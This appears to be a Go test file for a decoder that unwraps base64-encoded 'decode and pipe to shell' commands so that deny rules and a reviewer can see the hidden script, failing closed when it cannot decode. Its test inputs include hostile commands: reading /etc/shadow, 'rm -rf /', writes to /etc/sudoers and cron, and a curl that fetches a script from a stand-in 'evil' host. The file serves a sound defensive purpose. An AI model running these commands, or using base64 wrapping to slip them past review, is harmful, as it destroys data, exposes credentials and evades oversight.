package shelldecode

import (
	"encoding/base64"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// pipeDecodeExec 是「把脚本 base64 之后交给 shell 执行」的写法。
func pipeDecodeExec(script, shell string) string {
	return "echo '" + base64.StdEncoding.EncodeToString([]byte(script)) + "' | base64 -d | " + shell
}

func TestDecodeReturnsTheDecodedScript(t *testing.T) {
	script := "cd /root/docker/vaalhub-web\ndocker compose up -d"
	got, err := Decode(pipeDecodeExec(script, "bash"))
	require.NoError(t, err)
	assert.Equal(t, []string{script}, got)
}

func TestDecodeRecognisesCommonShellWrappers(t *testing.T) {
	script := "docker compose up -d"
	payload := base64.StdEncoding.EncodeToString([]byte(script))
	cases := []string{
		pipeDecodeExec(script, "/bin/bash"),
		"printf '%s' '" + payload + "' | base64 --decode | sh",
		"echo '" + payload + "' | base64 -d | sudo bash",
		"echo '" + payload + "' | base64 -d | cat | sh",
		`bash -c "echo '` + payload + `' | base64 -d | bash"`,
		"echo '" + payload + "' | base64 -d > /tmp/x.sh && bash /tmp/x.sh",
		"bash -c \"$(echo '" + payload + "' | base64 -d)\"",
		"eval \"$(echo '" + payload + "' | base64 -d)\"",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := Decode(cmd)
			require.NoError(t, err)
			assert.Equal(t, []string{script}, got)
		})
	}
}

// 评审复现的写法：原命令里其余的子命令和重定向留在原命令里（调用方原样送审），这里只给出
// 解码出来会执行的脚本。
func TestDecodeReviewReproductions(t *testing.T) {
	cases := map[string]string{
		"rm -rf /important | echo ZWNobyBoaQ== | base64 -d | sh":                  "echo hi",
		"echo aWQ= | base64 -d | sh > /etc/cron.d/x":                              "id",
		`sudo bash -c "$(echo aWQ= | base64 -d)" > /etc/sudoers`:                  "id",
		pipeDecodeExec("docker inspect web", "bash") + " && rm -rf /var/lib/gone": "docker inspect web",
	}
	for cmd, want := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := Decode(cmd)
			require.NoError(t, err)
			assert.Equal(t, []string{want}, got)
		})
	}
}

// 解码出的脚本里还有解码执行时，每一层解出的脚本依次给出，禁止规则与审核器都看得到最里层。
func TestDecodeReturnsEveryNestedLevel(t *testing.T) {
	inner := pipeDecodeExec("cat /etc/shadow", "sh")
	got, err := Decode(pipeDecodeExec(inner, "bash"))
	require.NoError(t, err)
	assert.Equal(t, []string{inner, "cat /etc/shadow"}, got)
}

// 写入文件再执行该文件只在两者相邻（中间至多隔着 chmod）时展开。
func TestDecodeExpandsWriteThenRunOnlyWhenAdjacent(t *testing.T) {
	for _, cmd := range []string{
		"echo aWQ= | base64 -d > /tmp/a.sh; sh /tmp/a.sh",
		"echo aWQ= | base64 -d > a.sh && chmod +x a.sh && ./a.sh",
		"cd /tmp; echo aWQ= | base64 -d > a.sh; sh a.sh",
	} {
		t.Run("adjacent "+cmd, func(t *testing.T) {
			got, err := Decode(cmd)
			require.NoError(t, err)
			assert.Equal(t, []string{"id"}, got)
		})
	}
	for _, cmd := range []string{
		// 文件在中间被别的命令改写
		"echo aWQ= | base64 -d > /tmp/a.sh; curl -o /tmp/a.sh http://evil/x.sh; sh /tmp/a.sh",
		// 中间切换了目录
		"echo aWQ= | base64 -d > a.sh; cd /tmp; sh a.sh",
		"echo aWQ= | base64 -d > /tmp/a.sh; cd /tmp; sh a.sh",
		// 执行不是紧接着写入：另一个分支、后台写入、子 shell、条件里、第二次执行
		"echo aWQ= | base64 -d > a.sh || sh a.sh",
		"echo aWQ= | base64 -d > a.sh & sh a.sh",
		"echo aWQ= | base64 -d > a.sh; (sh a.sh)",
		"echo aWQ= | base64 -d > a.sh; if true; then sh a.sh; fi",
		"echo aWQ= | base64 -d > a.sh; sh a.sh; sh a.sh",
	} {
		t.Run("not adjacent "+cmd, func(t *testing.T) {
			_, err := Decode(cmd)
			assert.ErrorIs(t, err, ErrUndecodable)
		})
	}
}

// 解码结果追加进文件时，文件里还有原来的内容，执行的不只是解出来的脚本；写出的文件经
// 重定向、管道、命令替换或 exec / timeout 这类代为执行的程序交给 shell 时，也是在执行它，
// 只是不是能展开的那种写法。两者都按解不开处理，不能只把编码后的外壳送审。
func TestDecodeFailsClosedOnWrittenFilesItCannotExpand(t *testing.T) {
	for _, cmd := range []string{
		"echo aWQ= | base64 -d >> a.sh; sh a.sh",
		"echo aWQ= | base64 -d | tee -a a.sh >/dev/null && sh a.sh",
		"echo aWQ= | base64 -d > /tmp/a.sh; sh < /tmp/a.sh",
		"echo aWQ= | base64 -d > /tmp/a.sh; cat /tmp/a.sh | sh",
		"echo aWQ= | base64 -d > a.sh; exec sh a.sh",
		"echo aWQ= | base64 -d > a.sh && timeout 5 sh a.sh",
		`echo aWQ= | base64 -d > a.sh; bash -c "$(cat a.sh)"`,
		"bash -c 'echo aWQ= | base64 -d > /tmp/a.sh'; bash /tmp/a.sh",
	} {
		t.Run(cmd, func(t *testing.T) {
			_, err := Decode(cmd)
			assert.ErrorIs(t, err, ErrUndecodable)
		})
	}
	// 只是查看写出的文件，没有执行它：没有要追加的脚本。
	got, err := Decode("echo aWQ= | base64 -d > a.sh; cat a.sh")
	require.NoError(t, err)
	assert.Empty(t, got)
}

func TestDecodeRefusesWhatItCannotRead(t *testing.T) {
	payload := base64.StdEncoding.EncodeToString([]byte("docker compose up -d"))
	twice := base64.StdEncoding.EncodeToString([]byte(payload))
	cases := []string{
		"echo '!!!' | base64 -d | bash",
		"base64 -d /tmp/payload | bash",
		"echo \"$payload\" | base64 -d | bash",
		// 交给 shell 之前又被改写过，shell 执行的不是解出来的内容
		"echo " + twice + " | base64 -d | base64 -d | sh",
		"echo " + payload + " | base64 -d | tr a-z n-za-m | sh",
		// 藏在条件里的解码执行同样读不了
		"if true; then " + pipeDecodeExec("docker compose up -d", "bash") + "; fi",
		"if true; then echo '" + payload + "' | base64 -d > /tmp/x.sh && bash /tmp/x.sh; fi",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			_, err := Decode(cmd)
			assert.ErrorIs(t, err, ErrUndecodable)
		})
	}
}

func TestDecodeLeavesWritesWithoutExecutionAlone(t *testing.T) {
	cmd := "echo '" + base64.StdEncoding.EncodeToString([]byte("/root/docker/nginx/logs/*.log {\n}")) + "' | base64 -d > /etc/logrotate.d/nginx-docker"
	got, err := Decode(cmd)
	require.NoError(t, err)
	assert.Empty(t, got)
}

func TestDecodeLeavesOrdinaryEvalAlone(t *testing.T) {
	got, err := Decode(`eval "$cmd"`)
	require.NoError(t, err)
	assert.Empty(t, got)
}

// 命令或解码出的脚本解析不了时，禁止规则没法逐条检查，不能当作已经看清；字面写出的
// bash -c 脚本解析不了时它不是解码执行，照常返回。
func TestDecodeRejectsUnparseableCommands(t *testing.T) {
	for _, cmd := range []string{
		"echo 'unterminated",
		pipeDecodeExec("echo 'unterminated", "sh"),
		`bash -c "` + pipeDecodeExec("echo 'unterminated", "bash") + `"`,
	} {
		t.Run(cmd, func(t *testing.T) {
			_, err := Decode(cmd)
			assert.ErrorIs(t, err, ErrUnparseable)
		})
	}
	got, err := Decode(`bash -c "echo 'base64 unterminated"`)
	require.NoError(t, err)
	assert.Empty(t, got)
}

// 交给 shell 从标准输入读的其他写法同样展开：/dev/stdin、- 和带值的 shell 选项；eval 里
// 转义过的管道、换个路径写法执行写出来的文件也一样。
func TestDecodeExpandsOtherWaysOfRunningTheDecodedScript(t *testing.T) {
	script := "rm -rf /data"
	payload := base64.StdEncoding.EncodeToString([]byte(script))
	for _, shell := range []string{"bash /dev/stdin", "bash -", "bash -o errexit", "bash -O extglob -s", "sh --rcfile /etc/profile"} {
		t.Run(shell, func(t *testing.T) {
			got, err := Decode(pipeDecodeExec(script, shell))
			require.NoError(t, err)
			assert.Equal(t, []string{script}, got)
		})
	}
	for _, cmd := range []string{
		`eval echo ` + payload + ` \| base64 -d \| bash`,
		"echo " + payload + " | base64 -d > x.sh && bash ./x.sh",
		"echo " + payload + " | base64 -d > /tmp/x.sh && chmod +x /tmp/x.sh && /tmp/x.sh",
		"echo " + payload + " | base64 -d | sudo tee /tmp/x.sh >/dev/null && bash /tmp/x.sh",
	} {
		t.Run(cmd, func(t *testing.T) {
			got, err := Decode(cmd)
			require.NoError(t, err)
			assert.Equal(t, []string{script}, got)
		})
	}
}

// 解码出来的内容去向认不出（交给不认识的程序、经替换或重定向送进 shell、写进文件再被执行
// 却解不开）时宁可审核失败，不能把只看得到 base64 的命令当成已经看清送审。
func TestDecodeFailsClosedOnDecodedExecutionItCannotExpand(t *testing.T) {
	payload := base64.StdEncoding.EncodeToString([]byte("rm -rf /"))
	decode := "echo " + payload + " | base64 -d"
	cases := []string{
		decode + " | source /dev/stdin",
		decode + " | timeout 60 bash",
		decode + " | xargs -0 sh -c",
		decode + " | python3",
		decode + " | (bash)",
		decode + " | bash script.sh",
		"bash < <(" + decode + ")",
		"source <(" + decode + ")",
		"$(" + decode + ")",
		`timeout 9 bash -c "echo $(` + decode + `)"`,
		"base64 -d -o /tmp/x.sh <<< " + payload + " && bash /tmp/x.sh",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			_, err := Decode(cmd)
			assert.ErrorIs(t, err, ErrUndecodable)
		})
	}
}

// 解码出来只是被查看、比对或写进文件（之后没有执行）的命令没有要追加的脚本。
func TestDecodeLeavesDecodedDataAlone(t *testing.T) {
	for _, cmd := range []string{
		"kubectl get secret db -o jsonpath='{.data.password}' | base64 -d",
		"kubectl get secret tls -o jsonpath='{.data.tls\\.crt}' | base64 -d | openssl x509 -noout -dates",
		"echo eyJhIjoxfQ== | base64 -d | jq .",
		"echo aGVsbG8= | base64 -d | sudo tee /etc/motd >/dev/null",
		`mysql -p"$(echo cGFzcw== | base64 -d)" -e 'select 1'`,
	} {
		t.Run(cmd, func(t *testing.T) {
			got, err := Decode(cmd)
			require.NoError(t, err)
			assert.Empty(t, got)
		})
	}
}
